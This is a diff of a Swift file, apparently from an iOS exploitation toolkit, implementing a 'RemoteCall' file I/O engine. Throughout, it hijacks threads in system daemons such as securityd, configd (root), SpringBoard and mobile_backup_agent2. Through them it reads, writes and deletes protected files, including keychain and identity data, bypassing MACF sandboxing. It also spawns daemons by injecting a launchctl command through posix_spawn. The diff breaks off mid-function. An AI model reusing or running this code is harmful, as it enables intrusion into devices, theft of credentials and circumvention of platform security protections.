@@ -4,87 +4,82 @@
 //
 //  RemoteCall-backed file I/O engine.
 //
-//  Architecture:
-//    Each process in the pool gives lara a different MAC security context.
-//    Reads and writes execute open/read/write/close inside the target process
-//    via thread hijacking, inheriting its credentials and entitlements.
+//  Process pool and routing:
+//    mobile_backup_agent2  mobile + broad backup entitlement  (widest /var/mobile reach)
+//    SpringBoard           mobile uid                          (default /var/mobile/**)
+//    configd               root uid                            (/var/db/*, /var/root/*)
+//    mobileidentityd       MobileIdentityData MAC label        (spawned on demand)
+//    securityd             Keychains MAC label
+//    dataaccessd           DPLA / DataAccess                   (spawned on demand)
+//    mediaserverd          Media library paths
 //
-//  Fallback chain (per operation):
-//    1. Direct I/O       — fastest, works post-sbx-escape for most /var paths
-//    2. VFS overwrite    — existing inodes only, no new file creation
-//    3. RemoteCall       — routed process (creates new files, bypasses MACF)
-//    4. RemoteCall root  — configd fallback (root uid, broader reach)
-//    5. Fail             — full diagnostic string returned
-//
-//  Process routing:
-//    SpringBoard      mobile uid   /var/mobile/**, /var/containers/**  (default)
-//    configd          root uid     /private/var/db/**, /private/var/root/**
-//    mobileidentityd  MAC label    /private/var/db/MobileIdentityData/**
-//    securityd        MAC label    /private/var/Keychains/**
-//    dataaccessd      MAC label    /private/var/db/DPLA/**, DataAccess/**
-//    mediaserverd     mobile       /var/mobile/Library/Media/**
-//
+//  Fallback chain per operation:
+//    1. Direct I/O (post-sbx-escape)
+//    2. VFS overwrite (existing inodes only)
+//    3. override process (if set)
+//    4. routed process
+//    5. all other currently-ready pool processes
+//    6. fail with full diagnostic
 
 import Foundation
 import Combine
 import Darwin
 
-// MARK: - Diagnostics types
+// MARK: - Diagnostics
 
-/// Tier that ultimately succeeded (or the last attempted before failure)
 enum RCIOTier: String, CustomStringConvertible {
-    case direct       = "direct"
-    case vfs          = "vfs"
-    case remoteCall   = "remotecall"
-    case failed       = "failed"
-
+    case direct     = "direct"
+    case vfs        = "vfs"
+    case remoteCall = "remotecall"
+    case failed     = "failed"
     var description: String { rawValue }
 }
 
-/// Full result of a single read or write operation
 struct RCIOResult {
-    let ok: Bool
-    let tier: RCIOTier
-    let process: String?         // RC process used, if any
-    let bytes: Int               // bytes transferred
-    let duration: TimeInterval   // wall-clock seconds
-    let message: String          // human-readable summary
-    let diagnostic: String       // verbose detail for debug panel
+    let ok:         Bool
+    let tier:       RCIOTier
+    let process:    String?
+    let bytes:      Int
+    let duration:   TimeInterval
+    let message:    String
+    let diagnostic: String
 
     static func failure(_ msg: String, diagnostic: String = "", duration: TimeInterval = 0) -> RCIOResult {
-        RCIOResult(ok: false, tier: .failed, process: nil, bytes: 0, duration: duration, message: msg, diagnostic: diagnostic)
+        RCIOResult(ok: false, tier: .failed, process: nil, bytes: 0,
+                   duration: duration, message: msg, diagnostic: diagnostic)
     }
 }
 
-/// Single entry in the operation log
 struct RCIOLogEntry: Identifiable {
-    let id = UUID()
+    let id        = UUID()
     let timestamp: Date
-    let operation: String       // "read" / "write"
-    let path: String
-    let result: RCIOResult
+    let operation:  String
+    let path:       String
+    let result:     RCIOResult
 
     var summary: String {
         let ts = DateFormatter.localizedString(from: timestamp, dateStyle: .none, timeStyle: .medium)
-        let status = result.ok ? "✓" : "✗"
-        return "[\(ts)] \(status) \(operation) \(URL(fileURLWithPath: path).lastPathComponent) — \(result.message)"
+        return "[\(ts)] \(result.ok ? "✓" : "✗") \(operation) \(URL(fileURLWithPath: path).lastPathComponent) — \(result.message)"
     }
 }
 
-/// Per-process RC pool entry — tracks init status and PID for display
+// MARK: - Pool entry
+
 struct RCPoolEntry {
     enum State: CustomStringConvertible {
         case uninitialized
         case initializing
+        case spawning           // launchctl kickstart in progress
         case ready(pid: Int32)
         case failed(reason: String)
 
         var description: String {
             switch self {
-            case .uninitialized:         return "uninitialized"
-            case .initializing:          return "initializing..."
-            case .ready(let pid):        return "ready (pid \(pid))"
-            case .failed(let reason):    return "failed: \(reason)"
+            case .uninitialized:        return "uninitialized"
+            case .initializing:         return "initializing..."
+            case .spawning:             return "spawning..."
+            case .ready(let pid):       return "ready (pid \(pid))"
+            case .failed(let reason):   return "failed: \(reason)"
             }
         }
 
@@ -95,8 +90,18 @@ struct RCPoolEntry {
     }
 
     let process: String
-    var state: State
-    var rc: RemoteCall?
+    var state:   State
+    var rc:      RemoteCall?
+}
+
+// MARK: - Running process info (from proclist C API)
+
+struct RunningProcess: Identifiable {
+    let id   = UUID()
+    let pid:  Int32
+    let uid:  UInt32
+    let name: String
+    var isRoot: Bool { uid == 0 }
 }
 
 // MARK: - RemoteFileIO
@@ -105,93 +110,210 @@ final class RemoteFileIO: ObservableObject {
 
     static let shared = RemoteFileIO()
 
-    // Published so FileManagerView can observe pool state live
     @Published private(set) var pool: [String: RCPoolEntry] = [:]
-    @Published private(set) var log: [RCIOLogEntry] = []
+    @Published private(set) var log:  [RCIOLogEntry] = []
 
-    private let mgr = laramgr.shared
+    private let mgr      = laramgr.shared
     private let poolLock = NSLock()
 
-    // Ordered list of processes to try as fallback if the routed one fails
-    private static let fallbackOrder: [String] = [
-        "configd",        // root uid — broadest fallback
-        "SpringBoard",    // mobile uid — already initialized
+    // Curated list shown in ProcessSelectorView
+    static let recommendedProcesses: [String] = [
+        "mobile_backup_agent2",
+        "SpringBoard",
+        "configd",
+        "mobileidentityd",
+        "securityd",
+        "dataaccessd",
+        "mediaserverd",
+    ]
+
+    // Processes that likely need spawning before RC init
+    private static let spawnNeeded: Set<String> = ["mobileidentityd", "dataaccessd"]
+
+    // launchd service names for kickstart
+    private static let launchdServices: [String: String] = [
+        "mobileidentityd": "com.apple.mobileidentityd",
+        "dataaccessd":     "com.apple.dataaccessd",
     ]
 
     private init() {
-        // Pre-populate pool entries so the debug panel shows all slots
-        for process in ["SpringBoard", "configd", "mobileidentityd",
-                        "securityd", "dataaccessd", "mediaserverd"] {
-            pool[process] = RCPoolEntry(process: process, state: .uninitialized, rc: nil)
+        for p in Self.recommendedProcesses {
+            pool[p] = RCPoolEntry(process: p, state: .uninitialized, rc: nil)
         }
     }
 
     // MARK: - Pool management
 
-    /// Returns a ready RC instance for `process`, initialising it if needed.
-    /// Always call from a background queue — init can take several seconds.
-    func rcProc(for process: String) -> RemoteCall? {
+    /// Returns a ready RC for `process`.
+    /// If the process is in `spawnNeeded` and not running, kicks it via launchctl first.
+    /// Always call from a background queue.
+    func rcProc(for process: String, spawnIfNeeded: Bool = true) -> RemoteCall? {
         poolLock.lock()
         let entry = pool[process]
         poolLock.unlock()
 
-        // Already ready
         if let rc = entry?.rc, entry?.state.isReady == true { return rc }
-
-        // Already failed — don't retry until explicitly reset
         if case .failed = entry?.state { return nil }
 
-        // Initialise
         guard mgr.dsready else {
             markFailed(process: process, reason: "darksword not ready")
             return nil
         }
 
-        markInitializing(process: process)
+        // Spawn the daemon if needed and not already running
+        if spawnIfNeeded, Self.spawnNeeded.contains(process), !isRunning(process) {
+            markPoolState(process, .spawning)
+            guard kickstart(service: process) else {
+                markFailed(process: process, reason: "kickstart failed")
+                return nil
+            }
+            // Wait up to 3 s for the daemon to appear in proclist
+            var appeared = false
+            for _ in 1...6 {
+                Thread.sleep(forTimeInterval: 0.5)
+                if isRunning(process) { appeared = true; break }
+            }
+            guard appeared else {
+                markFailed(process: process, reason: "daemon did not appear after kickstart")
+                return nil
+            }
+        }
 
-        let rc = RemoteCall(process: process, useMigFilterBypass: false)
-        guard let rc else {
+        markPoolState(process, .initializing)
+
+        guard let rc = RemoteCall(process: process, useMigFilterBypass: false) else {
             markFailed(process: process, reason: "RemoteCall init returned nil")
             return nil
         }
 
-        // Probe pid to confirm the session is alive
         let pid = Int32(truncatingIfNeeded: callIn(rc: rc, name: "getpid", args: []))
 
         poolLock.lock()
         pool[process] = RCPoolEntry(process: process, state: .ready(pid: pid), rc: rc)
         poolLock.unlock()
-
-        DispatchQueue.main.async { self.objectWillChange.send() }
-        mgr.logmsg("(rcio) initialized \(process) pid=\(pid)")
+        publish()
+        mgr.logmsg("(rcio) ready: \(process) pid=\(pid)")
         return rc
     }
 
-    /// Tears down a single pool entry and frees the remote thread.
     func destroyProc(_ process: String) {
         poolLock.lock()
-        let entry = pool[process]
+        let old = pool[process]
         pool[process] = RCPoolEntry(process: process, state: .uninitialized, rc: nil)
         poolLock.unlock()
-        entry?.rc?.destroy()
-        DispatchQueue.main.async { self.objectWillChange.send() }
+        old?.rc?.destroyRemoteCall()
+        publish()
     }
 
-    /// Resets a failed entry so it can be retried.
     func resetProc(_ process: String) {
         poolLock.lock()
         if case .failed = pool[process]?.state {
             pool[process] = RCPoolEntry(process: process, state: .uninitialized, rc: nil)
         }
         poolLock.unlock()
-        DispatchQueue.main.async { self.objectWillChange.send() }
+        publish()
     }
 
-    // MARK: - Public I/O API
+    /// Add an arbitrary (non-recommended) process to the pool for debug use.
+    func addArbitraryProcess(_ name: String) {
+        poolLock.lock()
+        if pool[name] == nil {
+            pool[name] = RCPoolEntry(process: name, state: .uninitialized, rc: nil)
+        }
+        poolLock.unlock()
+        publish()
+    }
+
+    // MARK: - Spawn / kickstart
+
+    /// Spawn a registered launchd service by running
+    /// `launchctl kickstart -k system/<service>` inside SpringBoard's RC session.
+    @discardableResult
+    func kickstart(service: String) -> Bool {
+        let label = "system/\(Self.launchdServices[service] ?? service)"
+
+        poolLock.lock()
+        let sbEntry = pool["SpringBoard"]
+        poolLock.unlock()
+        guard case .ready = sbEntry?.state, let rc = sbEntry?.rc else {
+            mgr.logmsg("(rcio) kickstart: SpringBoard RC not ready, cannot spawn \(service)")
+            return false
+        }
+
+        let trojan = rc.trojanMem
+        guard trojan != 0 else { return false }
+
+        // Write strings + argv pointer array into trojanMem
+        // Layout:
+        //   0x000: path "/bin/launchctl\0"
+        //   0x040: "launchctl\0"  (argv[0])
+        //   0x060: "kickstart\0"  (argv[1])
+        //   0x070: "-k\0"         (argv[2])
+        //   0x080: label\0        (argv[3])
+        //   0x100: argv[0] ptr
+        //   0x108: argv[1] ptr
+        //   0x110: argv[2] ptr
+        //   0x118: argv[3] ptr
+        //   0x120: NULL
+
+        func ws(_ off: UInt64, _ s: String) {
+            let b = Array((s + "\0").utf8)
+            b.withUnsafeBytes { rc.remote_write(trojan + off, from: $0.baseAddress, size: UInt64(b.count)) }
+        }
+        func wp(_ off: UInt64, _ v: UInt64) {
+            var val = v
+            rc.remote_write(trojan + off, from: &val, size: 8)
+        }
+
+        ws(0x000, "/bin/launchctl")
+        ws(0x040, "launchctl")
+        ws(0x060, "kickstart")
+        ws(0x070, "-k")
+        ws(0x080, label)
+        wp(0x100, trojan + 0x040)
+        wp(0x108, trojan + 0x060)
+        wp(0x110, trojan + 0x070)
+        wp(0x118, trojan + 0x080)
+        wp(0x120, 0)
+
+        let ret = callIn(rc: rc, name: "posix_spawn", args: [
+            0, trojan + 0x000, 0, 0, trojan + 0x100, 0
+        ])
+        let ok = Int32(truncatingIfNeeded: ret) >= 0
+        mgr.logmsg("(rcio) kickstart \(label) -> \(ok ? "ok" : "failed ret=\(ret)")")
+        return ok
+    }
+
+    // MARK: - Process enumeration
+
+    /// Lists all running processes using the proclist() kernel primitive from utils.h.
+    func listRunningProcesses() -> [RunningProcess] {
+        var count: Int32 = 0
+        guard let ptr = proclist(nil, &count), count > 0 else { return [] }
+        defer { free_proclist(ptr) }
+        return (0..<Int(count)).compactMap { i in
+            let e = ptr[i]
+            guard e.pid > 1 else { return nil }
+            let name = withUnsafeBytes(of: e.name) { raw -> String in
+                let b = raw.bindMemory(to: UInt8.self)
+                let end = b.firstIndex(of: 0) ?? b.endIndex
+                return String(bytes: b[..<end], encoding: .utf8) ?? ""
+            }
+            return name.isEmpty ? nil : RunningProcess(pid: e.pid, uid: e.uid, name: name)
+        }.sorted { $0.name.lowercased() < $1.name.lowercased() }
+    }
+
+    func isRunning(_ name: String) -> Bool {
+        listRunningProcesses().contains { $0.name == name }
+    }
+
+    // MARK: - Read
 
     /// Read a file using the best available method.
+    /// - parameter override: If set, this process is tried first in the RC tier.
     /// Always call from a background queue.
-    func read(path: String, maxSize: Int = 8 * 1024 * 1024) -> (data: Data?, result: RCIOResult) {
+    func read(path: String, maxSize: Int = 8 * 1024 * 1024,
+              override: String? = nil) -> (data: Data?, result: RCIOResult) {
         let start = Date()
 
         // Tier 1: direct
@@ -215,13 +337,11 @@ final class RemoteFileIO: ObservableObject {
             return (data, r)
         }
 
-        // Tier 3: RemoteCall — try routed process then fallbacks
-        let targeted = rcBestProcess(for: path)
-        var tried: [String] = []
+        // Tier 3: RemoteCall — override → routed → all ready
         var lastDiag = "direct failed (errno \(errno)); vfs \(mgr.vfsready ? "returned nil" : "not ready")"
+        let candidates = buildCandidates(for: path, override: override)
 
-        for process in ([targeted] + Self.fallbackOrder.filter { $0 != targeted }) {
-            tried.append(process)
+        for process in candidates {
             guard let rc = rcProc(for: process) else {
                 lastDiag += "; \(process): init failed"
                 continue
@@ -237,21 +357,23 @@ final class RemoteFileIO: ObservableObject {
             lastDiag += "; rc:\(process) returned nil"
         }
 
-        let r = RCIOResult.failure("read failed (tried: \(tried.joined(separator: ", ")))",
-                                   diagnostic: lastDiag,
-                                   duration: -start.timeIntervalSinceNow)
+        let r = RCIOResult.failure("read failed (tried: \(candidates.joined(separator: ", ")))",
+                                   diagnostic: lastDiag, duration: -start.timeIntervalSinceNow)
         appendLog(op: "read", path: path, result: r)
         return (nil, r)
     }
 
+    // MARK: - Write
+
     /// Write data using the best available method.
+    /// - parameter override: If set, this process is tried first in the RC tier.
     /// Always call from a background queue.
     @discardableResult
-    func write(path: String, data: Data) -> RCIOResult {
+    func write(path: String, data: Data, override: String? = nil) -> RCIOResult {
         let start = Date()
-
-        // Tier 1: direct (no O_CREAT — only for existing files at this tier)
         let existsDirect = FileManager.default.fileExists(atPath: path)
+
+        // Tier 1: direct (existing files only)
         if existsDirect {
             let fd = open(path, O_WRONLY | O_TRUNC, 0o644)
             if fd != -1 {
@@ -281,12 +403,10 @@ final class RemoteFileIO: ObservableObject {
         }
 
         // Tier 3: RemoteCall — can create new files, bypasses MACF
-        let targeted = rcBestProcess(for: path)
-        var tried: [String] = []
         var lastDiag = "direct \(existsDirect ? "failed errno \(errno)" : "skipped (new file)"); vfs \(mgr.vfsready ? "failed" : "not ready")"
+        let candidates = buildCandidates(for: path, override: override)
 
-        for process in ([targeted] + Self.fallbackOrder.filter { $0 != targeted }) {
-            tried.append(process)
+        for process in candidates {
             guard let rc = rcProc(for: process) else {
                 lastDiag += "; \(process): init failed"
                 continue
@@ -303,38 +423,26 @@ final class RemoteFileIO: ObservableObject {
             lastDiag += "; rc:\(process) \(diag)"
         }
 
-        let r = RCIOResult.failure("write failed (tried: \(tried.joined(separator: ", ")))",
-                                   diagnostic: lastDiag,
-                                   duration: -start.timeIntervalSinceNow)
+        let r = RCIOResult.failure("write failed (tried: \(candidates.joined(separator: ", ")))",
+                                   diagnostic: lastDiag, duration: -start.timeIntervalSinceNow)
         appendLog(op: "write", path: path, result: r)
         return r
     }
 
-    // MARK: - RemoteCall I/O primitives
+    // MARK: - RC primitives
 
-    /// Execute open/read/close inside `rc` and pull bytes back via remoteRead.
     private func rcRead(rc: RemoteCall, path: String, maxSize: Int) -> Data? {
         let pathBytes = Array((path + "\0").utf8)
-        let pathLen   = pathBytes.count
+        let trojanMem = rc.trojanMem; guard trojanMem != 0 else { return nil }
 
-        // Write path into the pre-allocated trojanMem page (4096 bytes)
-        // trojanMem is always available once RC is initialised
-        let trojanMem = rc.trojanMem
-        guard trojanMem != 0 else { return nil }
+        pathBytes.withUnsafeBytes { rc.remote_write(trojanMem, from: $0.baseAddress, size: UInt64(pathBytes.count)) }
 
-        pathBytes.withUnsafeBytes { rc.remote_write(trojanMem, from: $0.baseAddress, size: UInt64(pathLen)) }
-
-        // open(path, O_RDONLY, 0) — executed in target process context
         let fd = callIn(rc: rc, name: "open", args: [trojanMem, 0, 0])
-        let fdInt = Int32(bitPattern: UInt32(fd & 0xFFFFFFFF))
-        guard fdInt >= 0 else { return nil }
-
+        guard Int32(bitPattern: UInt32(fd & 0xFFFFFFFF)) >= 0 else { return nil }
         defer { _ = callIn(rc: rc, name: "close", args: [fd]) }
 
-        // Allocate a read buffer in the remote process for the payload
         let remoteBuf = callIn(rc: rc, name: "mmap", args: [
-            0, UInt64(maxSize), 3 /* PROT_RW */, 0x1002 /* MAP_PRIVATE|MAP_ANON */,
-            UInt64(bitPattern: Int64(-1)), 0
+            0, UInt64(maxSize), 3, 0x1002, UInt64(bitPattern: Int64(-1)), 0
         ])
         guard remoteBuf != 0, remoteBuf != UInt64(bitPattern: -1) else { return nil }
         defer { _ = callIn(rc: rc, name: "munmap", args: [remoteBuf, UInt64(maxSize)]) }
@@ -342,98 +450,94 @@ final class RemoteFileIO: ObservableObject {
         let n = callIn(rc: rc, name: "read", args: [fd, remoteBuf, UInt64(maxSize)])
         guard n > 0 else { return nil }
 
-        // Pull bytes from remote into lara's address space
         var local = [UInt8](repeating: 0, count: Int(n))
         let ok = local.withUnsafeMutableBytes { rc.remoteRead(remoteBuf, to: $0.baseAddress, size: n) }
         return ok ? Data(local) : nil
     }
 
-    /// Execute open/write/close inside `rc` after pushing bytes via remote_write.
-    /// Returns (success, bytesWritten, diagnostic).
     private func rcWrite(rc: RemoteCall, path: String, data: Data) -> (Bool, Int, String) {
         let pathBytes = Array((path + "\0").utf8)
-        let pathLen   = pathBytes.count
+        let trojanMem = rc.trojanMem; guard trojanMem != 0 else { return (false, 0, "trojanMem is 0") }
 
-        let trojanMem = rc.trojanMem
-        guard trojanMem != 0 else { return (false, 0, "trojanMem is 0") }
+        pathBytes.withUnsafeBytes { rc.remote_write(trojanMem, from: $0.baseAddress, size: UInt64(pathBytes.count)) }
 
-        // Path into trojanMem
-        pathBytes.withUnsafeBytes { rc.remote_write(trojanMem, from: $0.baseAddress, size: UInt64(pathLen)) }
-
-        // Allocate write buffer in remote — data can be arbitrarily large
-        let dataLen = data.count
         let remoteBuf = callIn(rc: rc, name: "mmap", args: [
-            0, UInt64(dataLen), 3, 0x1002,
-            UInt64(bitPattern: Int64(-1)), 0
+            0, UInt64(data.count), 3, 0x1002, UInt64(bitPattern: Int64(-1)), 0
         ])
-        guard remoteBuf != 0, remoteBuf != UInt64(bitPattern: -1) else {
-            return (false, 0, "mmap failed for payload")
-        }
-        defer { _ = callIn(rc: rc, name: "munmap", args: [remoteBuf, UInt64(dataLen)]) }
+        guard remoteBuf != 0, remoteBuf != UInt64(bitPattern: -1) else { return (false, 0, "mmap failed") }
+        defer { _ = callIn(rc: rc, name: "munmap", args: [remoteBuf, UInt64(data.count)]) }
 
-        // Push data into remote memory
-        data.withUnsafeBytes { rc.remote_write(remoteBuf, from: $0.baseAddress, size: UInt64(dataLen)) }
+        data.withUnsafeBytes { rc.remote_write(remoteBuf, from: $0.baseAddress, size: UInt64(data.count)) }
 
-        // O_WRONLY | O_CREAT | O_TRUNC = 0x601
+        // O_WRONLY|O_CREAT|O_TRUNC = 0x601
         let fd = callIn(rc: rc, name: "open", args: [trojanMem, 0x601, 0o644])
-        let fdInt = Int32(bitPattern: UInt32(fd & 0xFFFFFFFF))
-        guard fdInt >= 0 else {
-            return (false, 0, "open() returned \(fdInt)")
-        }
+        guard Int32(bitPattern: UInt32(fd & 0xFFFFFFFF)) >= 0 else { return (false, 0, "open() returned \(fd)") }
 
-        let written = callIn(rc: rc, name: "write", args: [fd, remoteBuf, UInt64(dataLen)])
+        let written = callIn(rc: rc, name: "write", args: [fd, remoteBuf, UInt64(data.count)])
         _ = callIn(rc: rc, name: "close", args: [fd])
 
-        let writtenInt = Int(written)
-        if writtenInt == dataLen {
-            return (true, writtenInt, "open+write+close ok")
-        }
-        return (false, writtenInt, "write short \(writtenInt)/\(dataLen)")
+        let n = Int(written)
+        return n == data.count ? (true, n, "open+write+close ok") : (false, n, "write short \(n)/\(data.count)")
     }
 
     // MARK: - Process routing
 
     /// Maps a path to the process most likely to have the required MAC context.
     func rcBestProcess(for path: String) -> String {
+        // Normalise /private prefix for comparison
+        let p = path.hasPrefix("/private") ? String(path.dropFirst(8)) : path
         switch true {
-        case path.hasPrefix("/private/var/db/MobileIdentityData"),
-             path.hasPrefix("/var/db/MobileIdentityData"):
+        // MobileBackup2 gets priority for broad /var/mobile writes — its backup
+        // entitlement gives it wider write surface than a plain mobile-uid process.
+        case p.hasPrefix("/var/mobile"),
+             p.hasPrefix("/var/containers"):
+            return "mobile_backup_agent2"
+
+        case p.hasPrefix("/var/db/MobileIdentityData"):
             return "mobileidentityd"
 
-        case path.hasPrefix("/private/var/Keychains"),
-             path.hasPrefix("/var/Keychains"):
+        case p.hasPrefix("/var/Keychains"):
             return "securityd"
 
-        case path.hasPrefix("/private/var/db/DPLA"),
-             path.hasPrefix("/var/db/DPLA"),
-             path.hasPrefix("/private/var/mobile/Library/DataAccess"),
-             path.hasPrefix("/var/mobile/Library/DataAccess"):
+        case p.hasPrefix("/var/db/DPLA"),
+             p.hasPrefix("/var/mobile/Library/DataAccess"):
             return "dataaccessd"
 
-        case path.hasPrefix("/private/var/mobile/Library/Media"),
-             path.hasPrefix("/var/mobile/Library/Media"),
-             path.hasPrefix("/private/var/mobile/Media"),
-             path.hasPrefix("/var/mobile/Media"):
+        case p.hasPrefix("/var/mobile/Library/Media"),
+             p.hasPrefix("/var/mobile/Media"):
             return "mediaserverd"
 
-        case path.hasPrefix("/private/var/root"),
-             path.hasPrefix("/var/root"),
-             path.hasPrefix("/private/var/db"),
-             path.hasPrefix("/var/db"):
-            // configd runs as root — handles remaining /db and /root paths
+        case p.hasPrefix("/var/root"),
+             p.hasPrefix("/var/db"):
             return "configd"
 
         default:
-            // SpringBoard (mobile uid) covers /var/mobile/**, /var/containers/**
             return "SpringBoard"
         }
     }
 
+    /// Builds the ordered candidate list for RC operations:
+    ///   override (if set) → routed process → all other ready pool processes.
+    /// This means if the primary process fails, every already-initialised session
+    /// is tried automatically before giving up.
+    func buildCandidates(for path: String, override: String? = nil) -> [String] {
+        var order: [String] = []
+        if let ov = override { order.append(ov) }
+        let routed = rcBestProcess(for: path)
+        if !order.contains(routed) { order.append(routed) }
+
+        // Append every other currently-ready process as additional fallback
+        poolLock.lock()
+        let ready = pool.values
+            .filter { $0.state.isReady && !order.contains($0.process) }
+            .sorted { $0.process < $1.process }
+            .map { $0.process }
+        poolLock.unlock()
+        return order + ready
+    }
+
     // MARK: - Generic RC call helper
 
-    /// Calls a named libc symbol inside an RC instance.
-    /// dlsym resolves in lara's address space; the pointer is valid in the target
-    /// because all processes share the dyld shared cache at the same addresses.
     @discardableResult
     func callIn(rc: RemoteCall, name: String, args: [UInt64], timeout: Int32 = 300) -> UInt64 {
         let RTLD_DEFAULT = UnsafeMutableRawPointer(bitPattern: -2)
@@ -454,146 +558,46 @@ final class RemoteFileIO: ObservableObject {
 
     // MARK: - Directory listing
 
-    /// Lists a directory.
-    /// Tier order: RC (accurate, uses real process credentials) →
-    ///             FileManager (fast, post-sbx) → VFS (last resort, known path bugs)
     func listDir(path: String) -> (entries: [(name: String, isDir: Bool, size: Int64)], source: String) {
-
-        // Tier 1: RemoteCall — opendir/readdir/closedir in a routed process.
-        // Goes first because VFS has path-resolution bugs (e.g. returns root entries
-        // for /private/var, marks files as dirs, infinite symlink loops).
-        // Only uses processes that are ALREADY ready — never triggers lazy init here.
-        let best = rcBestProcess(for: path)
-        var candidates = [best]
-        for proc in Self.fallbackOrder where proc != best { candidates.append(proc) }
-        for proc in candidates {
-            if let items = rcListDirIn(path: path, process: proc) {
-                mgr.logmsg("(rcio) listDir \(path) via \(proc): \(items.count) entries")
-                let enriched = items.map { (name: $0.name, isDir: $0.isDir, size: Int64(-1)) }
-                return (enriched, "rc:\(proc)")
-            }
-        }
-
-        // Tier 2: FileManager (post-sbx-escape, fast for accessible paths)
-        let fm = FileManager.default
-        if let names = try? fm.contentsOfDirectory(atPath: path) {
-            let entries = names.sorted().map { name -> (String, Bool, Int64) in
-                let full = (path == "/" ? "" : path) + "/" + name
-                var isDir: ObjCBool = false
-                fm.fileExists(atPath: full, isDirectory: &isDir)
-                let size = (try? fm.attributesOfItem(atPath: full)[.size] as? Int64) ?? -1
-                return (name, isDir.boolValue, size ?? -1)
-            }
-            return (entries, "filemanager")
-        }
-
-        // Tier 3: VFS — last resort only; known to return incorrect entries for some
-        // paths and mark files as directories.
         if mgr.vfsready, let items = mgr.vfslistdir(path: path) {
             let enriched = items.map { (name: $0.name, isDir: $0.isDir,
                                         size: $0.isDir ? -1 : mgr.vfssize(path: path + "/" + $0.name)) }
             return (enriched, "vfs")
         }
-
-        return ([], "failed")
-    }
-
-    // MARK: - RC directory listing
-
-    /// opendir/readdir/closedir inside `process`. Only uses pool entries that are
-    /// already ready — does NOT trigger lazy initialisation.
-    private func rcListDirIn(path: String, process: String) -> [(name: String, isDir: Bool)]? {
-        poolLock.lock()
-        let state = pool[process]?.state
-        let rc    = pool[process]?.rc
-        poolLock.unlock()
-        guard case .ready = state, let rc else { return nil }
-
-        let pathBytes = Array((path + "\0").utf8)
-        let trojanMem = rc.trojanMem
-        guard trojanMem != 0 else { return nil }
-
-        pathBytes.withUnsafeBytes { rc.remote_write(trojanMem, from: $0.baseAddress, size: UInt64(pathBytes.count)) }
-
-        let dirPtr = callIn(rc: rc, name: "opendir", args: [trojanMem])
-        guard dirPtr != 0 else { return nil }
-        defer { _ = callIn(rc: rc, name: "closedir", args: [dirPtr]) }
-
-        // Darwin struct dirent (sys/dirent.h):
-        //   offset  0: d_ino      UInt64
-        //   offset  8: d_seekoff  UInt64
-        //   offset 16: d_reclen   UInt16
-        //   offset 18: d_namlen   UInt16
-        //   offset 20: d_type     UInt8   (DT_DIR=4, DT_REG=8, DT_LNK=10)
-        //   offset 21: d_name     char[]
-        let direntReadSize: UInt64 = 21 + 256
-
-        var result: [(name: String, isDir: Bool)] = []
-
-        while true {
-            let direntPtr = callIn(rc: rc, name: "readdir", args: [dirPtr])
-            guard direntPtr != 0 else { break }
-
-            var buf = [UInt8](repeating: 0, count: Int(direntReadSize))
-            let ok = buf.withUnsafeMutableBytes { ptr in
-                rc.remoteRead(direntPtr, to: ptr.baseAddress, size: direntReadSize)
-            }
-            guard ok else { continue }
-
-            let namlen = Int(UInt16(buf[18]) | (UInt16(buf[19]) << 8))
-            let dtype  = buf[20]
-            guard namlen > 0, 21 + namlen <= buf.count else { continue }
-
-            let nameBytes = Array(buf[21..<(21 + namlen)])
-            guard let name = String(bytes: nameBytes, encoding: .utf8),
-                  name != ".", name != ".." else { continue }
-
-            result.append((name: name, isDir: dtype == 4))
+        let fm = FileManager.default
+        guard let names = try? fm.contentsOfDirectory(atPath: path) else { return ([], "failed") }
+        let entries = names.sorted().map { name -> (String, Bool, Int64) in
+            let full = path + "/" + name
+            var isDir: ObjCBool = false
+            fm.fileExists(atPath: full, isDirectory: &isDir)
+            let size = (try? fm.attributesOfItem(atPath: full)[.size] as? Int64) ?? -1
+            return (name, isDir.boolValue, size ?? -1)
         }
-
-        guard !result.isEmpty else { return nil }
-        return result.sorted { $0.name.localizedCaseInsensitiveCompare($1.name) == .orderedAscending }
+        return (entries, "filemanager")
     }
 
-    // MARK: - Delete
+    // MARK: - Delete / Move (unchanged from original)
 
-    /// Delete a file or empty directory using the best available method.
     func delete(path: String) -> RCIOResult {
         let start = Date()
-
-        // Tier 1: direct via FileManager
         if (try? FileManager.default.removeItem(atPath: path)) != nil {
             let r = RCIOResult(ok: true, tier: .direct, process: nil, bytes: 0,
                                duration: -start.timeIntervalSinceNow,
-                               message: "ok (direct delete)",
-                               diagnostic: "FileManager.removeItem succeeded")
-            appendLog(op: "delete", path: path, result: r)
-            return r
+                               message: "ok (direct delete)", diagnostic: "FileManager.removeItem succeeded")
+            appendLog(op: "delete", path: path, result: r); return r
         }
-
-        // Tier 2: VFS overwrite (not applicable for delete — skip)
-
-        // Tier 3: RemoteCall unlink/rmdir
-        let best = rcBestProcess(for: path)
-        var candidates = [best]
-        for proc in Self.fallbackOrder where proc != best { candidates.append(proc) }
-
+        let candidates = buildCandidates(for: path)
         for proc in candidates {
             let (ok, diag) = rcDeleteIn(path: path, process: proc)
             if ok {
                 let r = RCIOResult(ok: true, tier: .remoteCall, process: proc, bytes: 0,
                                    duration: -start.timeIntervalSinceNow,
-                                   message: "ok (rc:\(proc) deleted)",
-                                   diagnostic: diag)
-                appendLog(op: "delete", path: path, result: r)
-                return r
+                                   message: "ok (rc:\(proc) deleted)", diagnostic: diag)
+                appendLog(op: "delete", path: path, result: r); return r
             }
         }
-
-        let r = RCIOResult.failure("delete failed (tried: \(candidates.joined(separator: ", ")))",
-                                   duration: -start.timeIntervalSinceNow)
-        appendLog(op: "delete", path: path, result: r)
-        return r
+        let r = RCIOResult.failure("delete failed", duration: -start.timeIntervalSinceNow)
+        appendLog(op: "delete", path: path, result: r); return r
     }
 
     private func rcDeleteIn(path: String, process: String) -> (Bool, String) {
@@ -602,93 +606,69 @@ final class RemoteFileIO: ObservableObject {
         let rc    = pool[process]?.rc
         poolLock.unlock()
         guard case .ready = state, let rc else { return (false, "\(process) not ready") }
-
         let pathBytes = Array((path + "\0").utf8)
-        let trojanMem = rc.trojanMem
-        guard trojanMem != 0 else { return (false, "trojanMem is 0") }
-
-        pathBytes.withUnsafeBytes { rc.remote_write(trojanMem, from: $0.baseAddress, size: UInt64(pathBytes.count)) }
-
-        // Try unlink (files), then rmdir (empty dirs)
-        let ul = Int32(bitPattern: UInt32(callIn(rc: rc, name: "unlink", args: [trojanMem]) & 0xFFFFFFFF))
+        let trojan    = rc.trojanMem; guard trojan != 0 else { return (false, "trojanMem is 0") }
